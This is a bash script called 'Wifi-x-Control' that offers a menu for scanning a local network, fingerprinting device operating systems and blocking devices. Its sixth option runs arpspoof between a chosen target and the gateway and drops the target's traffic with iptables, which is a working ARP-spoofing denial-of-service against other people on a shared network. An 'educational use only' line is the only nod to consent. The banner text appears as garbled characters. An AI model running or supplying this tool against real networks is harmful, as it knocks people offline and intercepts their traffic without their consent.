#!/bin/bash

# Wifi-x-Control v1.1 - by reshot2005 ğŸ’€ğŸ˜


while true; do
    clear
    echo -e "\033[91;1m"
    echo "        â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–„â–„â–„       â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆ â–„â–ˆâ–€"
    echo "       â–’â–ˆâ–ˆâ–€ â–€â–ˆ  â–’â–ˆâ–ˆâ–ˆâ–ˆâ–„    â–’â–ˆâ–ˆâ–€ â–€â–ˆ   â–ˆâ–ˆâ–„â–ˆâ–’ "
    echo "       â–’â–“â–ˆ    â–„ â–’â–ˆâ–ˆ  â–€â–ˆâ–„  â–’â–“â–ˆ    â–„ â–“â–ˆâ–ˆâ–ˆâ–„â–‘ "
    echo "       â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–„â–„â–„â–„â–ˆâ–ˆ â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–ˆâ–„ "
    echo "       â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘ â–“â–ˆ   â–“â–ˆâ–ˆâ–’â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘â–’â–ˆâ–ˆâ–’ â–ˆâ–„"
    echo "       â–‘ â–‘â–’ â–’  â–‘ â–’â–’   â–“â–’â–ˆâ–‘â–‘ â–‘â–’ â–’  â–‘â–’ â–’â–’ â–“â–’"
    echo "         â–‘  â–’     â–’   â–’â–’ â–‘  â–‘  â–’   â–‘ â–‘â–’ â–’â–‘"
    echo "       â–‘          â–‘   â–’   â–‘        â–‘ â–‘â–‘ â–‘"
    echo "       â–‘ â–‘            â–‘  â–‘â–‘ â–‘      â–‘  â–‘  "
    echo "       â–‘                   â–‘             "
    echo -e "\033[0m"
    echo -e "\033[91;1m"
    echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "â•‘                                                                                 â•‘"
    echo "â•‘      â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—               â•‘"
    echo "â•‘      â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ•‘  â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—              â•‘"
    echo "â•‘      â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘   â•šâ–ˆâ–ˆâ–ˆâ•”â•     â–ˆâ–ˆâ•‘   â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘              â•‘"
    echo "â•‘      â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—     â–ˆâ–ˆâ•‘    â•šâ–ˆâ–ˆâ•”â•  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘              â•‘"
    echo "â•‘      â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆ   â–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•              â•‘"
    echo "â•‘       â•šâ•â•â•â•šâ•â•â• â•šâ•â•â•šâ•â•     â•šâ•â•  â•šâ•â•  â•šâ•â•    â•šâ•â•â•â•â•â• â•šâ•â•    â•šâ•â•â•â•â•â•               â•‘"
    echo "â•‘                                                                                 â•‘"
    echo "â•‘                       \033[92;1mWifi-x-Control v1.0 - by reshot2005\033[91;1m   â•‘"
    echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo -e "\033[92mâš ï¸  Use this tool responsibly. For educational use only. âš ï¸\033[0m"
    echo -e "\033[96m[+] Main Menu\033[0m"
    echo "1. ğŸ” Scan Network (ARP or Nmap)"
    echo "2. ğŸ“¡ Block Device by IP"
    echo "3. ğŸ”“ Unblock Device by IP"
    echo "4. ğŸ§¾ Show Currently Blocked IPs"
    echo "5. ğŸ§  Identify OS of a Device"
    echo "6. ğŸ¯ Spoof + Block a Device"
    echo "7. ğŸšª Exit"
    read -p $'\n\033[93m[?] Choose an option: \033[0m' choice

    case $choice in
        1)
            echo "Choose scan method:"
            echo "1. ARP-Scan (faster)"
            echo "2. Nmap Ping Scan (deeper)"
            read -p "Select [1 or 2]: " scan_choice
            if [ "$scan_choice" == "1" ]; then
                read -p "Enter your network interface (e.g. wlan0): " iface
                sudo arp-scan --interface=$iface --localnet
            elif [ "$scan_choice" == "2" ]; then
                read -p "Enter network range (e.g. 192.168.20.0/24): " net_range
                sudo nmap -sn $net_range
            else
                echo "Invalid option."
            fi
            read -p "Press Enter to return to menu..."
            ;;
        2)
            read -p "[ BLOCK DEVICE ] Enter target IP to BLOCK: " target_ip
            sudo iptables -A FORWARD -s "$target_ip" -j DROP
            echo "[âœ“] $target_ip is now BLOCKED!"
            read -p "Press Enter to return to menu..."
            ;;
        3)
            read -p "[ UNBLOCK DEVICE ] Enter target IP to UNBLOCK: " target_ip
            echo "[*] Checking for rules to remove..."
            sudo iptables -L FORWARD --line-numbers | grep "$target_ip" | grep DROP | awk '{print $1}' | sort -nr | while read line; do
                sudo iptables -D FORWARD $line
            done
            echo "[âœ“] $target_ip is now UNBLOCKED (all rules removed)!"
            read -p "Press Enter to return to menu..."
            ;;
        4)
            echo "Currently Blocked IPs (iptables FORWARD chain):"
            sudo iptables -L FORWARD --line-numbers
            read -p "Press Enter to return to menu..."
            ;;
        5)
            read -p "Enter the target IP to analyze OS (e.g. 192.168.20.7): " os_ip
            sudo nmap -O "$os_ip"
            read -p "Press Enter to return to menu..."
            ;;
        6)
            read -p "Enter interface (e.g. wlan0): " iface
            read -p "Enter your gateway IP (usually 192.168.x.1): " gw
            read -p "Enter target IP to spoof & block: " target_ip
            echo "[*] Starting ARP spoofing..."
            sudo arpspoof -i $iface -t $target_ip $gw &
            SPOOF_PID=$!
            sleep 2
            echo "[*] Blocking device with iptables..."
            sudo iptables -A FORWARD -s "$target_ip" -j DROP
            echo "[âœ“] Spoofing + Blocking enabled for $target_ip"
            read -p "Press Enter to stop spoofing and return to menu..."
            kill $SPOOF_PID
            echo "[*] Spoofing stopped."
            ;;
        7)
            echo "Goodbye, Hacker ğŸ˜"
            break
            ;;
        *)
            echo "Invalid choice."
            sleep 1
            ;;
    esac
done
